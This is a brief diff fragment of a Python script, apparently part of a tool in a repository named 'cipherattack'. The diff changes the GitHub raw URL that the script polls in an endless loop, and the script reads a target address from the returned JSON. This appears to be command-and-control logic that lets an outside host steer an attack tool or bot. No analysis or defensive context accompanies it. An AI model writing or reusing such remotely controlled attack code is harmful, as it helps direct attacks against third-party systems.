@@ -84,7 +84,7 @@ except:
     pass
 while True:
     try:
-        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/jotr3n").read())
+        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/7Ha1").read())
         if "fine" in [i.lower() for i in data.keys()]:
             addr = list(data.values())[0]
         else:
